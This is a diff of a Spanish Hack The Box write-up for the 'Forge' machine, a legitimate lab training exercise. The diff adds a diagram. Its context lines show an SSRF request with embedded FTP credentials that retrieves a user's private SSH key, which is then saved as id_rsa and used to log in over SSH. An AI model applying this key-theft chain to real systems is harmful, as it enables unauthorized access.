@@ -94,9 +94,10 @@ $:> http://aDmIn.FoRgE.HtB/upload?u=ftp://user:heightofsecurity123!@FoRgE.hTb/.s
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 ....
 ```
-Modifique el script para que guardara esto en un archivo id_rsa y luego ```chmod 600 ./id_rsa```.
+Para explicar todo este lio de una manera mas visual:
+![forge htb](https://user-images.githubusercontent.com/96772264/196032244-dc07cb53-3ece-4005-aa1c-8c4f00f54fd2.png)
 
+Modifique el script para que guardara esto en un archivo id_rsa y luego ```chmod 600 ./id_rsa```.
 ```console
 └─$ ssh -i id_rsa user@10.10.11.111
-
 ```
